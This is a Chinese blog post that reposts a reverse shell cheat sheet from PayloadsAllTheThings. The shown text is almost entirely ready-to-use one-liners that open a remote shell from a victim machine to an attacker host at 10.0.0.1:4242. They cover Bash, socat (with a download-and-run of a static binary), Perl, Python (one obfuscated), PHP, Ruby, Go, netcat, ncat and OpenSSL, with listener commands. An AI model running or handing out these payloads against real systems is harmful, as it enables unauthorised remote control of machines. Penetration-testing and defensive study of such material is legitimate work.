<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>各种反弹shell | upload</title><meta name="author" content="upload"><meta name="copyright" content="upload"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="各种反弹shell">
<meta property="og:type" content="article">
<meta property="og:title" content="各种反弹shell">
<meta property="og:url" content="http://upload.love/2021/07/17/%E5%90%84%E7%A7%8D%E5%8F%8D%E5%BC%B9shell/index.html">
<meta property="og:site_name" content="upload">
<meta property="og:description" content="各种反弹shell">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://upload.love/image/35a85edf8db1cb133ee5e2433012064893584b9b.jpeg">
<meta property="article:published_time" content="2021-07-17T13:35:26.000Z">
<meta property="article:modified_time" content="2021-07-17T13:55:29.003Z">
<meta property="article:author" content="upload">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://upload.love/image/35a85edf8db1cb133ee5e2433012064893584b9b.jpeg"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="http://upload.love/2021/07/17/%E5%90%84%E7%A7%8D%E5%8F%8D%E5%BC%B9shell/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}

// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
const getScript = url => new Promise((resolve, reject) => {
  const script = document.createElement('script')
  script.src = url
  script.async = true
  script.onerror = reject
  script.onload = script.onreadystatechange = function() {
    const loadState = this.readyState
    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
    script.onload = script.onreadystatechange = null
    resolve()
  }
  document.head.appendChild(script)
})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-17 21:55:29'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'true'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="upload" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">141</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">132</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">upload</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">各种反弹shell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-17T13:35:26.000Z" title="发表于 2021-07-17 21:35:26">2021-07-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-17T13:55:29.003Z" title="更新于 2021-07-17 21:55:29">2021-07-17</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>21分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong><code>PayloadsAllTheThings-master</code> github上的有个项目不错！</strong></p>
<h1 id="Reverse-Shell-Cheat-Sheet"><a href="#Reverse-Shell-Cheat-Sheet" class="headerlink" title="Reverse Shell Cheat Sheet"></a>Reverse Shell Cheat Sheet</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li><a href="#reverse-shell">Reverse Shell</a><ul>
<li><a href="#awk">Awk</a></li>
<li><a href="#revshells">Automatic Reverse Shell Generator</a></li>
<li><a href="#bash-tcp">Bash TCP</a></li>
<li><a href="#bash-udp">Bash UDP</a></li>
<li><a href="#c">C</a></li>
<li><a href="#dart">Dart</a></li>
<li><a href="#golang">Golang</a></li>
<li><a href="#groovy-alternative-1">Groovy Alternative 1</a></li>
<li><a href="#groovy">Groovy</a></li>
<li><a href="#java-alternative-1">Java Alternative 1</a></li>
<li><a href="#java-alternative-2">Java Alternative 2</a></li>
<li><a href="#java">Java</a></li>
<li><a href="#lua">Lua</a></li>
<li><a href="#ncat">Ncat</a></li>
<li><a href="#netcat-openbsd">Netcat OpenBsd</a></li>
<li><a href="#netcat-busybox">Netcat BusyBox</a></li>
<li><a href="#netcat-traditional">Netcat Traditional</a></li>
<li><a href="#nodejs">NodeJS</a></li>
<li><a href="#openssl">OpenSSL</a></li>
<li><a href="#perl">Perl</a></li>
<li><a href="#php">PHP</a></li>
<li><a href="#powershell">Powershell</a></li>
<li><a href="#python">Python</a></li>
<li><a href="#ruby">Ruby</a></li>
<li><a href="#socat">Socat</a></li>
<li><a href="#war">War</a></li>
</ul>
</li>
<li><a href="#meterpreter-shell">Meterpreter Shell</a><ul>
<li><a href="#windows-staged-reverse-tcp">Windows Staged reverse TCP</a></li>
<li><a href="#windows-stageless-reverse-tcp">Windows Stageless reverse TCP</a></li>
<li><a href="#linux-staged-reverse-tcp">Linux Staged reverse TCP</a></li>
<li><a href="#linux-stageless-reverse-tcp">Linux Stageless reverse TCP</a></li>
<li><a href="#other-platforms">Other platforms</a></li>
</ul>
</li>
<li><a href="#spawn-tty-shell">Spawn TTY Shell</a></li>
<li><a href="#references">References</a></li>
</ul>
<h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><h3 id="Bash-TCP"><a href="#Bash-TCP" class="headerlink" title="Bash TCP"></a>Bash TCP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>

<h3 id="Bash-UDP"><a href="#Bash-UDP" class="headerlink" title="Bash UDP"></a>Bash UDP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Victim:</span><br><span class="line">sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Listener:</span><br><span class="line">nc -u -lvp 4242</span><br></pre></td></tr></table></figure>

<p>Don’t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>
<h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">user@attack<span class="variable">$</span> socat file:`tty`,raw,<span class="built_in">echo</span>=<span class="number">0</span> TCP<span class="literal">-L</span>:<span class="number">4242</span></span><br><span class="line">user@victim<span class="variable">$</span> /tmp/socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.0</span>.<span class="number">0.1</span>:<span class="number">4242</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">user@victim<span class="variable">$</span> <span class="built_in">wget</span> <span class="literal">-q</span> https://github.com/andrew<span class="literal">-d</span>/<span class="keyword">static</span><span class="literal">-binaries</span>/raw/master/binaries/linux/x86_64/socat <span class="literal">-O</span> /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.0</span>.<span class="number">0.1</span>:<span class="number">4242</span></span><br></pre></td></tr></table></figure>

<p>Static socat binary can be found at <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries</a></p>
<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTE: Windows only</span><br><span class="line">perl -MIO -e <span class="string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>Linux only</p>
<p>IPv4</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">export RHOST=<span class="string">&quot;10.0.0.1&quot;</span>;export RPORT=<span class="number">4242</span>;python -c <span class="string">&#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>IPv4</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>IPv6</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Windows only</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Python27\python.exe <span class="literal">-c</span> <span class="string">&quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#x27;10.0.0.1&#x27;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#x27;except&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type(&#x27;try&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#x27;p2s_thread&#x27;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#x27;s2p_thread&#x27;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#x27;p&#x27;] in [(subprocess.Popen([&#x27;\\windows\\system32\\cmd.exe&#x27;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;p2s&#x27;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#x27;s&#x27;].send(__l[&#x27;p&#x27;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#x27;s&#x27;], __l[&#x27;p&#x27;] in [(s, p)]][0])(&#123;&#125;), &#x27;p2s&#x27;)]][0] for __g[&#x27;s2p&#x27;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#x27;p&#x27;].stdin.write(__l[&#x27;data&#x27;]), __after())[1] if (len(__l[&#x27;data&#x27;]) &gt; 0) else __after())(lambda: __this()) for __l[&#x27;data&#x27;] in [(__l[&#x27;s&#x27;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#x27;s&#x27;], __l[&#x27;p&#x27;] in [(s, p)]][0])(&#123;&#125;), &#x27;s2p&#x27;)]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;threading&#x27;] in [(__import__(&#x27;threading&#x27;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#x27;contextlib&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);passthru(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,4242).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);loop&#123;c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r)&#123;|io|c.print io.read&#125;))rescue c.puts &quot;failed: <span class="subst">#&#123;$_&#125;</span>&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">NOTE:</span> Windows only</span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;10.0.0.1:4242&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27;</span> &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go</span><br></pre></td></tr></table></figure>

<h3 id="Netcat-Traditional"><a href="#Netcat-Traditional" class="headerlink" title="Netcat Traditional"></a>Netcat Traditional</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 4242</span><br><span class="line">nc -e /bin/bash 10.0.0.1 4242</span><br><span class="line">nc -c bash 10.0.0.1 4242</span><br></pre></td></tr></table></figure>

<h3 id="Netcat-OpenBsd"><a href="#Netcat-OpenBsd" class="headerlink" title="Netcat OpenBsd"></a>Netcat OpenBsd</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<h3 id="Netcat-BusyBox"><a href="#Netcat-BusyBox" class="headerlink" title="Netcat BusyBox"></a>Netcat BusyBox</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<h3 id="Ncat"><a href="#Ncat" class="headerlink" title="Ncat"></a>Ncat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncat 10.0.0.1 4242 -e /bin/bash</span><br><span class="line">ncat --udp 10.0.0.1 4242 -e /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h3><p>Attacker:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">user@attack<span class="variable">$</span> openssl req <span class="literal">-x509</span> <span class="literal">-newkey</span> rsa:<span class="number">4096</span> <span class="literal">-keyout</span> key.pem <span class="literal">-out</span> cert.pem <span class="literal">-days</span> <span class="number">365</span> <span class="literal">-nodes</span></span><br><span class="line">user@attack<span class="variable">$</span> openssl s_server <span class="literal">-quiet</span> <span class="literal">-key</span> key.pem <span class="literal">-cert</span> cert.pem <span class="literal">-port</span> <span class="number">4242</span></span><br><span class="line">or</span><br><span class="line">user@attack<span class="variable">$</span> ncat -<span class="literal">-ssl</span> <span class="literal">-vv</span> <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">4242</span></span><br><span class="line"></span><br><span class="line">user@victim<span class="variable">$</span> mkfifo /tmp/s; /bin/sh <span class="literal">-i</span> &lt; /tmp/s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client <span class="literal">-quiet</span> <span class="literal">-connect</span> <span class="number">10.0</span>.<span class="number">0.1</span>:<span class="number">4242</span> &gt; /tmp/s; <span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure>

<p>TLS-PSK (does not rely on PKI or self-signed certificates)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># generate 384-bit PSK</span></span><br><span class="line"><span class="comment"># use the generated string as a value for the two PSK variables from below</span></span><br><span class="line">openssl rand -hex 48 </span><br><span class="line"><span class="comment"># server (attacker)</span></span><br><span class="line"><span class="built_in">export</span> LHOST=<span class="string">&quot;*&quot;</span>; <span class="built_in">export</span> LPORT=<span class="string">&quot;4242&quot;</span>; <span class="built_in">export</span> PSK=<span class="string">&quot;replacewithgeneratedpskfromabove&quot;</span>; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk <span class="variable">$PSK</span> -nocert -accept <span class="variable">$LHOST</span>:<span class="variable">$LPORT</span></span><br><span class="line"><span class="comment"># client (victim)</span></span><br><span class="line"><span class="built_in">export</span> RHOST=<span class="string">&quot;10.0.0.1&quot;</span>; <span class="built_in">export</span> RPORT=<span class="string">&quot;4242&quot;</span>; <span class="built_in">export</span> PSK=<span class="string">&quot;replacewithgeneratedpskfromabove&quot;</span>; <span class="built_in">export</span> PIPE=<span class="string">&quot;/tmp/`openssl rand -hex 4`&quot;</span>; mkfifo <span class="variable">$PIPE</span>; /bin/sh -i &lt; <span class="variable">$PIPE</span> 2&gt;&amp;1 | openssl s_client -quiet -tls1_2 -psk <span class="variable">$PSK</span> -connect <span class="variable">$RHOST</span>:<span class="variable">$RPORT</span> &gt; <span class="variable">$PIPE</span>; rm <span class="variable">$PIPE</span></span><br></pre></td></tr></table></figure>

